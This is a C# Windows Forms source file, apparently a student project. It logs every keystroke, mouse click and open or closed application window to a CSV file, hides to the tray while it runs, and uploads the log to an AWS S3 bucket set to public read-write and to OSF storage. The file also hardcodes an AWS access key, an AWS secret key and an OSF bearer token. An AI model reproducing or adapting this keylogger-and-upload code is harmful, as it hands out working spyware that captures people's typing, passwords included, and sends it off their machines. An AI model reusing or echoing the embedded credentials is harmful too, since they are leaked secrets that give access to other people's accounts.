using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using Amazon.S3;
using Amazon.S3.Transfer;
using System.Collections.Generic;
using System.Linq;
using System.Net;

namespace capf17g5project1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Text = "TPK";
            btnStop.Enabled = false;
            lblStatus.Visible = false;
            lblOSFuploadStatus.Visible = false;
            /*Progress Bar*/
            pBarUploadStatus.Visible = false;
            pBarUploadStatus.Minimum = 0;
            pBarUploadStatus.Maximum = 100;
        }

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        StringBuilder keyPressBuffer;
        private void Form1_Load(object sender, EventArgs e)
        {
            keyPressBuffer = new StringBuilder();
        }

        List<string> listCurrentProcess = new List<string>();
        List<string> listOld = new List<string>();
        List<String> listClosedProcess = new List<string>();

        #region LOG File Creation and START button code

        void CreateLog(string logFileName)
        {
            try
            {
                StreamWriter writer = new StreamWriter(logFileName, true); //append log to file
                writer.Write(keyPressBuffer.ToString());
                writer.Close();
                keyPressBuffer.Clear(); //reset buffer
            }
            catch { }
        }


        private void timerLog_Tick(object sender, EventArgs e)
        {
            int flagFileExists = 0;
            if (File.Exists(@"c:\logKeyPress.csv"))
            {
                flagFileExists = 1;
            }
            else
            {
                flagFileExists = 0;
            }
            CreateLog(@"c:\logKeyPress.csv");

            //adding header only if file doesn't exist
            if (flagFileExists == 0)
            {
                /*Log file formatting in Header*/
                //adding Header
                keyPressBuffer.Append("Code, Timestamp, Details,");
                //adding Code Legend
                keyPressBuffer.Append("Code => 0-Keypress|1-Applicatioons|2-MoususeClick");
                keyPressBuffer.Append("\n"); //new row                
            }
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            timerKeyPress.Enabled = false;
            timerLog.Enabled = false;
            btnStart.Enabled = true;
            btnStop.Enabled = false;
        }

        private void notifyPopup_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Show();
        }

        #endregion

        #region KeyPress Tracking / Logging

        private void btnStart_Click(object sender, EventArgs e)
        {
            timerProcessActivity.Enabled = true;
            listCurrentProcess.Clear();
            timerKeyPress.Enabled = true;
            timerLog.Enabled = true;
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            Form1 objForm1 = new Form1();
            objForm1.WindowState = FormWindowState.Minimized;
            notifyPopup.ShowBalloonTip(3500);
            this.Hide();
        }

        private void timerKeyPress_Tick(object sender, EventArgs e)
        {
            int typeOfEvent = 0;

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {
                    if ((Enum.GetName(typeof(Keys), i) == "LButton") || (Enum.GetName(typeof(Keys), i) == "MButton") || (Enum.GetName(typeof(Keys), i) == "RButton"))
                    {
                        typeOfEvent = 2; //Mouse Clicks
                    }
                    else
                    {
                        typeOfEvent = 0; //Keyboard key press
                    }
                    keyPressBuffer.Append(typeOfEvent);
                    keyPressBuffer.Append(",");
                    keyPressBuffer.Append(DateTime.Now.ToString("MMM/dd/yyyy hh:mm:ss:fff")); //or en-US
                    keyPressBuffer.Append(","); //new column
                    keyPressBuffer.Append(Enum.GetName(typeof(Keys), i));
                    keyPressBuffer.Append("\n"); //new row
                }
            }
        }

        #endregion       

        #region Process Tracking / Logging

        private void timerProcessActivity_Tick(object sender, EventArgs e)
        {
            Process[] processlist = Process.GetProcesses();
            int typeOfEvent = 1; //process

            if (listCurrentProcess.Count != 0)
            {
                listOld.Clear();
                listOld = new List<string>(listCurrentProcess);
                listCurrentProcess.Clear();
            }

            foreach (Process p in processlist)
            {
                if (!String.IsNullOrEmpty(p.MainWindowTitle))
                {
                    listCurrentProcess.Add(p.MainWindowTitle);
                }
            }

            if (listClosedProcess.Count != 0)
            {
                listClosedProcess.Clear();
            }

            listClosedProcess = new List<string>(listOld.Except(listCurrentProcess)); //Get closed applications
            int lengthListClosedProcess = listClosedProcess.Count();
            if (lengthListClosedProcess >= 1) //print closed processes
            {
                foreach (String s in listClosedProcess)
                {
                    keyPressBuffer.Append(typeOfEvent);
                    keyPressBuffer.Append(",");
                    keyPressBuffer.Append(DateTime.Now.ToString("MMM/dd/yyyy hh:mm:ss")); //or en-US
                    keyPressBuffer.Append(","); //new column
                    keyPressBuffer.Append("CLOSED --> " + s.ToString());
                    keyPressBuffer.Append("\n"); //new row
                }
            }

            int lengthListCurrentProcess = listCurrentProcess.Count();
            foreach (String s in listCurrentProcess) //print open processes
            {
                keyPressBuffer.Append(typeOfEvent);
                keyPressBuffer.Append(",");
                keyPressBuffer.Append(DateTime.Now.ToString("MMM/dd/yyyy hh:mm:ss")); //or en-US
                keyPressBuffer.Append(","); //new column
                keyPressBuffer.Append("OPEN --> " + s.ToString());
                keyPressBuffer.Append("\n"); //new row
            }
        }

        #endregion

        #region Upload to AWS

        private void btnUpload_Click(object sender, EventArgs e)
        {
            lblStatus.Visible = true;
            pBarUploadStatus.Value = 5;
            pBarUploadStatus.Visible = true;
            lblStatus.Text = "Status: UPLOADING....";
            uploadevent();
        }

        private void uploadevent()
        {
            string filePath = @"c:\logKeyPress.csv";
            string existingBucketName = "capf17g5"; //Created manually 
            var accessKey = "AKIAIGBVXNNLMB4OPC6A";
            var secretKey = "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";

            try
            {
                TransferUtility fileTransferUtility = new
                    TransferUtility(new AmazonS3Client(accessKey, secretKey, Amazon.RegionEndpoint.USEast1));
                /* Upload the file(file name is taken as the object key name). */

                try
                {
                    pBarUploadStatus.Value = 25;
                    fileTransferUtility.Upload(filePath, existingBucketName);
                }
                catch
                {
                    MessageBox.Show("File not found");
                    pBarUploadStatus.Value = 10;
                    lblStatus.Text = "Status: Idle";
                }

                pBarUploadStatus.Value = 50;
                /* Set the file storage class and the sharing type*/
                TransferUtilityUploadRequest fileTransferUtilityRequest = new TransferUtilityUploadRequest
                {
                    BucketName = existingBucketName,
                    FilePath = filePath,
                    StorageClass = S3StorageClass.Standard,
                    CannedACL = S3CannedACL.PublicReadWrite,
                    ContentType = "text/csv", //video/x-mp4 (MMIE type for video)
                };
                try
                {
                    pBarUploadStatus.Value = 75;
                    fileTransferUtility.Upload(fileTransferUtilityRequest);
                    lblStatus.Text = "Status: UPLOADED";
                    pBarUploadStatus.Value = 100;
                }
                catch
                {
                    lblStatus.Text = "Failed to upload the file";
                    pBarUploadStatus.Value = 10;
                }
            }
            catch (AmazonS3Exception)
            {
                lblStatus.Text = "Failed to upload the file";
                pBarUploadStatus.Value = 10;
            }
        }

        #endregion

        #region Upload to OSF

        private void btnUploadToOSF_Click(object sender, EventArgs e)
        {
            lblOSFuploadStatus.Visible = true;
            pBarUploadStatus.Value = 5;
            pBarUploadStatus.Visible = true;
            lblOSFuploadStatus.Text = "Status: UPLOADING....";
            uploadFileToOSF();
        }

        public void uploadFileToOSF()
        {
            string location = "pn24m";
            string filePath = @"c:\logKeyPress.csv";
            string nameTheFile = "logKeyPress_" + DateTime.Now.ToString("MMMddyyyyHHmmss") + ".csv";
            string authentication = "Bearer RUhnM3Je768HzmWEfqSIh7FP7QXK8qrXYI2j3NRJ1daiPOpMBxckhkYBWUR9105wFbexiU";//Navya

            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11;
                //Initiate a new web client
                WebClient wc = new WebClient();
                wc.Headers.Add("Authorization", authentication);
                wc.Headers[HttpRequestHeader.ContentType] = "application/vnd.api+json";
                //track upload progress
                wc.UploadProgressChanged += new UploadProgressChangedEventHandler(UploadProgressCallback);
                wc.UploadFile(new Uri("https://files.osf.io/v1/resources/" +
                    location + "/providers/osfstorage/?name=" + nameTheFile + "&kind=file"), "PUT", filePath);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                lblOSFuploadStatus.Text = "Upload not successful";
                pBarUploadStatus.Value = 10;
            }

            lblOSFuploadStatus.Text = "Uploaded to OSF Successfully!";
            pBarUploadStatus.Value = 100;
        }

        private void UploadProgressCallback(object sender, UploadProgressChangedEventArgs e) =>
            pBarUploadStatus.Value = e.ProgressPercentage;

        #endregion

    }
}
